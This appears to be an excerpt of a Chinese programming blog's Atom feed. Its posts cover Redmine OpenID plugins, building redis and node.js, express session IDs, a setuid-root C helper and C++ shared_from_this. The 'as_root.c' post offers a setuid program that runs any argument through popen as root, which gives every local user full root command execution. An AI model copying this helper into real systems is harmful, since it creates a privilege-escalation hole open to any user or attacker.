&lt;li&gt;&#20320;&#30340; &lt;code&gt;OpenID URL&lt;/code&gt; &#20026; &lt;a href="http://profiles.google.com/000000000000000000000"&gt;http://profiles.google.com/000000000000000000000&lt;/a&gt;

&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;     &#19978;&#38754;&#30340; &lt;code&gt;000000000000000000000&lt;/code&gt; &#21487;&#33021;&#20026;&#20219;&#24847;&#30340;&#25968;&#23383;&#20018;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#31649;&#29702;&#21592;&#30830;&#35748;&#27880;&#20876;&#21518;&#21363;&#21487;&#22312;&#30331;&#24405;&#30028;&#38754;&#19978;&#36755;&#20837; &lt;code&gt;OpenID URL&lt;/code&gt; &#30452;&#25509;&#30331;&#24405;

&lt;p&gt;     
     &#19968;&#33324;&#27983;&#35272;&#22120;&#30340;&#36755;&#20837;&#26694;&#26159;&#26377;&#35760;&#24518;&#21151;&#33021;&#30340;&#65292;&#21452;&#20987;&#21518;&#20250;&#20986;&#29616;&#36755;&#20837;&#21382;&#21490;&#19979;&#25289;&#21015;&#34920;&#65292;&#30452;&#25509;&#36873;&#25321;&#21363;&#21487;&#12290;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#23433;&#35013;&#25554;&#20214;&#31616;&#21270; &lt;code&gt;OpenID&lt;/code&gt; &#30331;&#24405;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jorgebg/redmine-openid-selector"&gt;https://github.com/jorgebg/redmine-openid-selector&lt;/a&gt; &#65288;&#19981;&#25512;&#33616;&#65289; &#20026;&#21407;&#22987;&#20998;&#26525;&#65292;&#22312; &lt;code&gt;redmine-2.5.0&lt;/code&gt; &#19979;&#19981;&#33021;&#30452;&#25509;&#23433;&#35013;&#20250;&#23548;&#33268;&#31449;&#28857;&#30331;&#24405;&#30028;&#38754;&#20986;&#29616;404&#38169;&#35823;&#65292;&#35299;&#20915;&#26041;&#26696;&#22312; &lt;a href="http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778"&gt;&#36825;&#37324;&lt;/a&gt; &#65292;&#31616;&#32780;&#35328;&#20043;&#23601;&#26159;&#25226;&#25554;&#20214;&#30446;&#24405;&#21517;&#20013;&#30340; &lt;code&gt;-&lt;/code&gt; &#25913;&#20026; &lt;code&gt;_&lt;/code&gt; &#12290;

&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/computerminds/redmine\_openid\_selector"&gt;https://github.com/computerminds/redmine_openid_selector&lt;/a&gt; &#65288;&#19981;&#25512;&#33616;&#65289; &#36825;&#20010;&#20998;&#26525;&#23433;&#35013;&#21518;&#21487;&#29992;&#65292;&#20294;&#30028;&#38754;&#20026;&#33521;&#25991;&#65288;&#20854;&#23454;&#30028;&#38754;&#23601;&#19968;&#21477;&#33521;&#25991;&#65289;&#12290;

&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tangxinfa/redmine\_openid\_selector"&gt;https://github.com/tangxinfa/redmine_openid_selector&lt;/a&gt; &#65288;&#25512;&#33616;&#65289; &#20026;&#25903;&#25345;&#20013;&#25991;&#25105;fork&#20102;&#19978;&#19968;&#20010;&#20998;&#26525;&#12290;

&lt;/li&gt;
&lt;li&gt;&#36890;&#29992;&#30340;&#25554;&#20214;&#23433;&#35013;&#36807;&#31243;&#65306;




&lt;pre class="src src-sh"&gt;&lt;span style="color: #729fcf;"&gt;cd&lt;/span&gt; plugins
git clone https://github.com/tangxinfa/redmine_openid_selector.git
rake redmine:plugins:migrate &lt;span style="color: #eeeeec;"&gt;RAILS_ENV&lt;/span&gt;=production
touch tmp/restart.txt
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#36890;&#29992;&#30340;&#25554;&#20214;&#21368;&#36733;&#36807;&#31243;&#65306;




&lt;pre class="src src-sh"&gt;rake redmine:plugins:migrate &lt;span style="color: #eeeeec;"&gt;NAME&lt;/span&gt;=redmine-openid-selector &lt;span style="color: #eeeeec;"&gt;VERSION&lt;/span&gt;=0 &lt;span style="color: #eeeeec;"&gt;RAILS_ENV&lt;/span&gt;=pr&lt;span style="text-decoration: underline;"&gt;oduction&lt;/span&gt;
rm -rf plugins/redmine-openid-selector
touch tmp/restart.txt
&lt;/pre&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;     &#29616;&#22312;&#22312;&#30331;&#24405;&#21450;&#27880;&#20876;&#39029;&#38754;&#30452;&#25509;&#28857;&#20987;&#31532;&#19977;&#26041;&#31449;&#28857;Logo&#21363;&#21487;&#12290;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-8" class="outline-3"&gt;
&lt;h3 id="sec-8"&gt;&#26679;&#24335;&#32654;&#21270;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-8"&gt;





&lt;pre class="src src-sh"&gt;git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-c&lt;span style="text-decoration: underline;"&gt;ookers&lt;/span&gt;
touch tmp/restart.txt
&lt;/pre&gt;


&lt;p&gt;
   &#29616;&#22312;&#21487;&#20197;&#20351;&#29992; &lt;code&gt;admin&lt;/code&gt; &#30331;&#24405;&#21518;&#21488;&#65292;&#22312;&#8220;&#31649;&#29702; - &#37197;&#32622; - &#26174;&#31034; - &#20027;&#39064;&#8221;&#20013;&#21551;&#29992;&#20027;&#39064; &lt;code&gt;Pixel-cookers&lt;/code&gt; &#12290;
&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;
</content></entry><entry><title type="html">编译安装redis</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/02/17_7f168bd15b8988c5redis.html"/><updated>2014-02-17T16:40:00Z</updated><published>2014-02-17T16:40:00Z</published><id>posts/2014/02/17_7f168bd15b8988c5redis.html</id><category scheme="/tags/redis.html" term="redis" label="redis"/><content type="html">&lt;ul&gt;
&lt;li&gt;&#19979;&#36733;

&lt;p&gt;    
    &#21040; &lt;a href="http://redis.io/download"&gt;http://redis.io/download&lt;/a&gt; &#19979;&#36733;&#26368;&#26032;&#31283;&#23450;&#29256;&#26412;&#12290;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#23433;&#35013;

&lt;p&gt;  
    &#35299;&#21387;&#21518;&#21442;&#29031; README &#36827;&#34892;&#23433;&#35013;&#65306;
&lt;/p&gt;



&lt;pre class="src src-sh"&gt;make
make install
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#23433;&#35013;&#21518;

&lt;p&gt;    
    &#40664;&#35748;&#23433;&#35013;&#21040;/usr/local&#12290;
&lt;/p&gt;
&lt;dl&gt;
&lt;dt&gt;/usr/local/bin/redis-cli&lt;/dt&gt;&lt;dd&gt;redis&#23458;&#25143;&#31471;&#31243;&#24207; 
&lt;/dd&gt;
&lt;dt&gt;/usr/local/bin/redis-server&lt;/dt&gt;&lt;dd&gt;redis&#26381;&#21153;&#22120;&#31243;&#24207;
&lt;/dd&gt;
&lt;/dl&gt;

&lt;/li&gt;
&lt;/ul&gt;

</content></entry><entry><title type="html">编译安装node.js</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/02/17_7f168bd15b8988c5node2ejs.html"/><updated>2014-02-17T16:23:00Z</updated><published>2014-02-17T16:23:00Z</published><id>posts/2014/02/17_7f168bd15b8988c5node2ejs.html</id><category scheme="/tags/node.html" term="node" label="node"/><content type="html">&lt;ul&gt;
&lt;li&gt;&#19979;&#36733;

&lt;p&gt;
    node.js&#26159;&#19968;&#20010;&#26032;&#20852;&#30340;&#24320;&#21457;&#24179;&#21488;&#65292;&#29256;&#26412;&#26356;&#26032;&#38750;&#24120;&#27963;&#36291;&#65292;&#22240;&#27492;&#24212;&#35813;&#23613;&#37327;&#19979;&#36733;&#23433;&#35013;&#26368;&#26032;&#30340;&#29256;&#26412;&#12290;
&lt;/p&gt;
&lt;p&gt;
    &#21040; &lt;a href="http://nodejs.org/"&gt;http://nodejs.org/&lt;/a&gt; &#19979;&#36733;&#26368;&#26032;&#30340;&#29256;&#26412;&#12290;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#23433;&#35013;

&lt;p&gt;  
    &#35299;&#21387;&#21518;&#21442;&#29031; README.md &#36827;&#34892;&#23433;&#35013;&#65306;
&lt;/p&gt;



&lt;pre class="src src-sh"&gt;./configure
make
make install
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#23433;&#35013;&#21518;

&lt;p&gt;    
    &#40664;&#35748;&#23433;&#35013;&#21040;/usr/local&#12290;
&lt;/p&gt;
&lt;dl&gt;
&lt;dt&gt;/usr/local/bin/node&lt;/dt&gt;&lt;dd&gt;node&#20027;&#31243;&#24207;
&lt;/dd&gt;
&lt;dt&gt;/usr/local/bin/npm&lt;/dt&gt;&lt;dd&gt;node&#27169;&#22359;&#31649;&#29702;&#31243;&#24207;
&lt;/dd&gt;
&lt;dt&gt;/usr/local/lib/node_modules&lt;/dt&gt;&lt;dd&gt;node&#20840;&#23616;&#27169;&#22359;&#30446;&#24405;

&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;    &#20687;&#19968;&#20123;&#38656;&#35201;&#20840;&#23616;&#23433;&#35013;&#30340;&#27169;&#22359;&#20063;&#20250;&#25226;&#25991;&#20214;&#23433;&#35013;&#22312;/usr/local&#30446;&#24405;&#19979;&#12290;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


</content></entry><entry><title type="html">express.js中如何在第一次请求的响应中取得connect.sid</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/02/14_express2ejs4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97connect2esid.html"/><updated>2014-02-14T23:34:00Z</updated><published>2014-02-14T23:34:00Z</published><id>posts/2014/02/14_express2ejs4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97connect2esid.html</id><category scheme="/tags/node.html" term="node" label="node"/><content type="html">&lt;p&gt;
  &#22312;web&#39029;&#38754;&#36890;&#36807;iframe&#36328;&#22495;&#30331;&#24405;&#35775;&#38382;&#26381;&#21153;&#30340;&#24773;&#20917;&#19979;&#65292;&#26159;&#19981;&#26041;&#20415;&#21462;cookie&#20013;&#30340;sessionid&#30340;&#65292;&#20110;&#26159;&#24819;&#21040;&#23558;sessionid&#30452;&#25509;&#25918;&#21040;&#21709;&#24212;&#20307;&#20013;&#65292;
  &#36825;&#23601;&#38656;&#35201;&#22312;node.js&#20013;&#30452;&#25509;&#33719;&#21462;connect.sid&#36825;&#20010;cookie&#20540;&#65292;&#19968;&#24320;&#22987;&#24819;&#24403;&#28982;&#22320;&#20197;&#20026;&#31995;&#32479;&#65288;&#20351;&#29992;&#30340;&#26159;passport.js&#65289;&#20250;&#22312;&#30331;&#24405;&#35748;&#35777;&#36890;&#36807;&#21518;
  &#25191;&#34892;res.cookie('connect.sid', &amp;hellip;)&#36827;&#34892;&#35774;&#32622;&#65292;&#23601;&#24819;&#30452;&#25509;&#20174;res&#30340;Set-Cookie&#22836;&#35299;&#26512;&#20986;&#35774;&#32622;&#30340;&#20540;&#65292;&#32467;&#26524;&#21457;&#29616;&#36825;&#20010;cookie&#21387;&#26681;&#19981;&#23384;&#22312;&#65292;
  &#29978;&#33267;&#22312;&#24211;&#20195;&#30721;&#20013;&#25628;&#32034;cookie&#37117;&#19981;&#31649;&#29992;&#65292;&#30528;&#23454;&#24613;&#24471;&#20154;&#30452;&#25235;&#22836;&#12290;&#26368;&#21518;dump&#20986;res&#21518;&#30830;&#22312;req&#20013;&#35265;&#21040;&#20102;connect.sid&#20540;&#30340;&#24433;&#23376;&#65306;req.sessionID&#65292;
  &#28982;&#21518;&#22312; &lt;a href="http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie"&gt;&#12298;Express SessionID differs from SessionID in Cookie&#12299;&lt;/a&gt; &#20013;&#25214;&#21040;&#20102;&#20174;req.sessionID&#35745;&#31639;&#20986;connect.sid&#30340;&#26041;&#27861;&#65306;
&lt;/p&gt;



&lt;pre class="src src-js"&gt;var signature = require(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'express/node_modules/cookie-signature'&lt;/span&gt;);
var connectSid = &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'s:'&lt;/span&gt; + signature.sign(req.sessionID, sessionOptions.secret);
&lt;/pre&gt;


&lt;p&gt;
  &#20854;&#23454;&#65292;connect.sid&#36825;&#20010;cookie&#26159;&#22312;&#35831;&#27714;&#21040;&#26469;&#21518;&#22312;req&#19978;&#35774;&#32622;&#30340;&#65288;&#19981;&#23384;&#22312;&#21017;&#35774;&#32622;&#65289;&#65292;&#19981;&#31649;&#26377;&#27809;&#26377;&#30331;&#24405;&#37117;&#20250;&#35774;&#32622;&#12290;
&lt;/p&gt;</content></entry><entry><title type="html">linux下允许普通用户执行需要root权限的命令</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2013/12/26_linux4e0b51418bb8666e901a752862376267884c97008981root674396507684547d4ee4.html"/><updated>2013-12-26T15:44:00Z</updated><published>2013-12-26T15:44:00Z</published><id>posts/2013/12/26_linux4e0b51418bb8666e901a752862376267884c97008981root674396507684547d4ee4.html</id><category scheme="/tags/linux.html" term="linux" label="linux"/><category scheme="/tags/c.html" term="c" label="c"/><content type="html">&lt;p&gt;
   &#26368;&#20856;&#22411;&#30340;&#24773;&#20917;&#26159;&#35201;&#23454;&#29616;&#19968;&#20010;&#36890;&#36807;web&#30028;&#38754;&#37325;&#21551;&#31995;&#32479;&#30340;&#21151;&#33021;&#65292;&#36890;&#24120;&#20026;&#20102;&#23433;&#20840;&#20250;&#20197;&#38750;root&#29992;&#25143;&#36523;&#20221;&#65288;&#36890;&#24120;&#26159;nobody&#65289;&#36816;&#34892;&#26381;&#21153;&#31471;&#33050;&#26412;&#65292;&#36825;&#26679;&#33050;&#26412;&#20013;&#23601;&#19981;&#33021;&#25191;&#34892;&#21361;&#38505;&#25805;&#20316;&#20102;&#12290;
&lt;/p&gt;
&lt;p&gt;
   &#19979;&#38754;&#30340;c&#24037;&#20855;&#31243;&#24207;&#21487;&#20197;&#20801;&#35768;&#20219;&#24847;&#29992;&#25143;&#25191;&#34892;&#38656;&#35201;root&#26435;&#38480;&#30340;&#21629;&#20196;&#65306;
&lt;/p&gt;


&lt;div class="o-blog-source"&gt;&lt;a class="btn btn-info" data-toggle="modal" data-target="#as5froot2ec" &gt;&lt;i class="icon-file icon-white"&gt;&lt;/i&gt;&amp;nbsp;as_root.c&lt;/a&gt;&lt;/div&gt;&lt;div class="modal fade hide" id="as5froot2ec"&gt;&lt;div class="modal-header"&gt;&lt;a class="close" data-dismiss="modal"&gt;&#215;&lt;/a&gt;&lt;h3&gt;as_root.c&lt;/h3&gt;&lt;/div&gt;&lt;div class="modal-body"&gt;&lt;pre&gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;

void daemon_init() {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   int i;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   pid_t pid;
&lt;span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"&gt;    &lt;/span&gt;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   if (pid = fork()) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   int status = EXIT_FAILURE;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   waitpid(pid, &amp;amp;status, 0);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   status = WEXITSTATUS(status);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   exit(status);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   setsid();
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   signal(SIGHUP, SIG_IGN);

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   if (pid = fork()) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   int status = EXIT_FAILURE;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   waitpid(pid, &amp;amp;status, 0);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   status = WEXITSTATUS(status);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   exit(status);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   umask(0);
}

int main(int argc, char* argv[]) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   if (setuid(0) == -1) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   perror(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"setuid"&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   fprintf(stderr, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"config: chown root:root %s; chmod 4755 %s\n"&lt;/span&gt;, argv[0], &lt;span style="text-decoration: underline;"&gt;argv[0]);&lt;/span&gt;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   return EXIT_FAILURE;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   daemon_init();

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   FILE* fp = popen(argv[1], &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"r"&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   if (NULL == fp) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   fprintf(stderr, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"popen failed\n"&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   return EXIT_FAILURE;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   int status = pclose(fp);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   if (-1 == status) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   fprintf(stderr, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"pclose failed\n"&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   return EXIT_FAILURE;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   status = WEXITSTATUS(status);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   return status;
}
&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;


&lt;p&gt;
   &#32534;&#35793;&#65306;
&lt;/p&gt;


&lt;pre class="src src-sh"&gt;gcc -g as_root.c -o as_root
&lt;/pre&gt;


&lt;p&gt;
   &#37197;&#32622;&#65306;
&lt;/p&gt;


&lt;pre class="src src-sh"&gt;chown root:root ./as_root; chmod 4755 ./as_root
&lt;/pre&gt;


&lt;p&gt;
   &#36816;&#34892;&#65306;
&lt;/p&gt;


&lt;pre class="src src-sh"&gt;sudo -u &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"nobody"&lt;/span&gt; ./as_root &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"reboot"&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;   
   &#21442;&#32771;&#65306;&lt;a href="http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&amp;amp;PostID=1629441"&gt;&#22914;&#20309;&#22312;&#26222;&#36890;&#29992;&#25143;&#19979;&#25191;&#34892;&#19968;&#20123;&#38656;&#35201;root&#29992;&#25143;&#25191;&#34892;&#30340;&#21629;&#20196;&lt;/a&gt;
&lt;/p&gt;</content></entry><entry><title type="html">为什么不能在构造函数中调用shared_from_this</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2013/12/20_4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528shared5ffrom5fthis.html"/><updated>2013-12-20T01:02:00Z</updated><published>2013-12-20T01:02:00Z</published><id>posts/2013/12/20_4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528shared5ffrom5fthis.html</id><category scheme="/tags/cpp.html" term="cpp" label="cpp"/><content type="html">&lt;p&gt;
  &#20808;&#30475;&#31034;&#20363;&#20195;&#30721;&#65306;
&lt;/p&gt;



&lt;pre class="src src-c++"&gt;class Chicken : public enable_shared_from_this&amp;lt;Chicken&amp;gt;
{
public:
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   Chicken()
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   shared_ptr&amp;lt;Chicken&amp;gt; chicken_ptr = shared_from_this();&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="color: #888a85;"&gt;//&lt;/span&gt;&lt;span style="color: #888a85;"&gt;throw std::ba&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;d_weak_ptr&lt;/span&gt;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }
};
&lt;/pre&gt;


&lt;p&gt;
  &#20877;&#30475;shared_from_this()&#30340;&#34892;&#20026;&#65306;
&lt;/p&gt;


&lt;pre class="src src-c++"&gt;return _weak_ptr-&amp;gt;lock();
&lt;/pre&gt;


&lt;p&gt;
  &lt;code&gt;_weak_ptr&lt;/code&gt; &#20026;&#29238;&#31867;&#65288; &lt;code&gt;enable_shared_from_this&lt;/code&gt; &amp;lt;Chicken&amp;gt;&#65289;&#30340;&#25104;&#21592;&#21464;&#37327;&#65292;&#38656;&#35201;&#19968;&#20010; &lt;code&gt;shared_ptr&lt;/code&gt; &amp;lt;Chicken&amp;gt;&#23545;&#35937;&#26469;&#21021;&#22987;&#21270;&#23427;&#65292;&#32780; &lt;code&gt;shared_ptr&lt;/code&gt; &amp;lt;Chicken&amp;gt;&#38656;&#35201;&#19968;&#20010;Chicken&#23545;&#35937;&#26469;&#21019;&#24314;&#65292;&#20294;&#27492;&#26102;Chicken&#23545;&#35937;&#27491;&#22312;&#26500;&#36896;&#20013;&#65292;&#36825;&#26159;&#20010;&#40481;&#19982;&#34507;&#30340;&#26080;&#35299;&#38382;&#39064;&#12290;
&lt;/p&gt;
&lt;p&gt;  
  &#20854;&#23454; &lt;code&gt;_weak_ptr&lt;/code&gt; &#25104;&#21592;&#21464;&#37327;&#26159;&#22312; &lt;code&gt;shared_ptr&lt;/code&gt; &#30340;&#26500;&#36896;&#20989;&#25968;&#20013;&#24310;&#36831;&#21021;&#22987;&#21270;&#30340;&#65292;&#19981;&#21482;&#26159;&#22312;&#26500;&#36896;&#20989;&#25968;&#20013;&#19981;&#33021;&#35843;&#29992; &lt;code&gt;shared_from_this&lt;/code&gt; &#65292;&#20687;&#19979;&#38754;&#30340;&#20351;&#29992;&#26041;&#24335;&#21516;&#26679;&#19981;&#34892;&#65306;
&lt;/p&gt;


&lt;pre class="src src-c++"&gt;Chicken* chicken = new Chicken();
shared_ptr&amp;lt;Chicken&amp;gt; chicken_ptr = chicken-&amp;gt;shared_from_this();  &lt;span style="color: #888a85;"&gt;//&lt;/span&gt;&lt;span style="color: #888a85;"&gt;throw std::bad&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;_weak_ptr&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;  
  &lt;code&gt;enable_shared_from_this&lt;/code&gt; &#19981;&#26159;&#20174;this&#31100;&#25351;&#38024;&#21464;&#20986;&#26234;&#33021;&#25351;&#38024;&#30340;&#39764;&#27861;&#65292;&#23427;&#21482;&#26159;&#19968;&#20010;&#36741;&#21161;&#31867;&#65292;&#20026;&#19968;&#20010;&#21482;&#20351;&#29992; &lt;code&gt;shared_ptr&lt;/code&gt; &#31649;&#29702;&#23545;&#35937;&#29983;&#21629;&#21608;&#26399;&#30340;&#31867;&#28155;&#21152;&#19968;&#20010;&#33258;&#36523;&#30340;&#26234;&#33021;&#25351;&#38024;&#25104;&#21592;&#21464;&#37327;&#20379;&#20869;&#37096;&#20351;&#29992;&#12290;
&lt;/p&gt;
&lt;p&gt;
  &#32780;&#8220;&#19981;&#33021;&#22312;&#26500;&#36896;&#20989;&#25968;&#20013;&#35843;&#29992; &lt;code&gt;shared_from_this&lt;/code&gt; &#8221;&#36825;&#20010;&#38382;&#39064;&#20165;&#20165;&#26159;&#26631;&#20934;&#23454;&#29616;&#19978;&#30340;&#19968;&#20010;&#28431;&#27934;&#12290;
&lt;/p&gt;
&lt;p&gt;
  &#20320;&#24212;&#35813;&#20687;&#19979;&#38754;&#36825;&#26679;&#29992;&#65306;
&lt;/p&gt;


&lt;pre class="src src-c++"&gt;class Chicken : public enable_shared_from_this&amp;lt;Chicken&amp;gt;
{
public:
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   Chicken()
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }

&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   void use()
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   &lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   shared_ptr&amp;lt;Chicken&amp;gt; chicken_ptr = shared_from_this();
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt;   }
};

shared_ptr&amp;lt;Chicken&amp;gt; chicken_ptr(new Chicken);
chicken_ptr-&amp;gt;use();
&lt;/pre&gt;


&lt;p&gt;
  &#31361;&#28982;&#24819;&#36215;&#19968;&#27573;&#23545;&#35805;&#65306;
&lt;/p&gt;&lt;blockquote&gt;

&lt;p&gt;&#38463;&#28422;&#65306;&#38395;&#35199;&#65292;&#20107;&#24773;&#36827;&#34892;&#30340;&#24590;&#20040;&#26679;&#20102;&#65292;&#38395;&#35199;&#65311;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306; &#26368;&#36817;&#25105;&#21457;&#26126;&#20102;&#20123;&#19996;&#35199;&#65292;&#30456;&#20449;&#33021;&#24110;&#24471;&#21040;&#20320;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#25343;&#20986;&#25163;&#30005;&#31570;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#38463;&#28422;&#65306;&#25163;&#30005;&#31570;&#65311;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306;&#38169;&#65292;&#36825;&#25903;&#19981;&#26159;&#19968;&#21482;&#26222;&#36890;&#30340;&#25163;&#30005;&#31570;&#65292;&#36825;&#25903;&#26159;&#19968;&#25903;&#19981;&#38656;&#35201;&#30005;&#27744;&#30340;&#22826;&#38451;&#33021;&#25163;&#30005;&#31570;&#65292;&#22312;&#26377;&#20809;&#30340;&#26102;&#20505;&#20182;&#23601;&#20250;&#20142;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#21496;&#20196;&#65306;&#37027;&#22914;&#26524;&#27809;&#26377;&#20809;&#21602;&#65311;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306;&#32477;&#23545;&#19981;&#20142;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#38463;&#28422;&#65306;&#26377;&#27809;&#26377;&#21487;&#33021;&#27809;&#20809;&#30340;&#26102;&#20505;&#23427;&#20063;&#20250;&#20142;&#65311;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306;&#38382;&#30340;&#22909;&#65292;&#20851;&#28783;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306;&#20320;&#25343;&#21478;&#19968;&#21482;&#25163;&#30005;&#31570;&#29031;&#23427;&#21602;&#65292;&#23427;&#23601;&#20250;&#20142;&#12290;
&lt;/p&gt;
&lt;p&gt;
&#36798;&#38395;&#35199;&#65306;&#21704;&#21704;&#65292;&#24590;&#20040;&#26679;&#21834;&#65311;
&lt;/p&gt;
&lt;p&gt;
&#38463;&#28422;&#65306;&#36825;&#20010;&#21457;&#26126;&#36824;&#30495;&#26377;&#21019;&#24847;&#21834;&#12290;
&lt;/p&gt;
&lt;/blockquote&gt;




&lt;p&gt;
  &#21442;&#32771;&#65306;&#12298;&lt;a href="http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0"&gt;shared_from_this &#20960;&#20010;&#20540;&#24471;&#27880;&#24847;&#30340;&#22320;&#26041;&lt;/a&gt;&#12299;
&lt;/p&gt;</content></entry>
</feed>
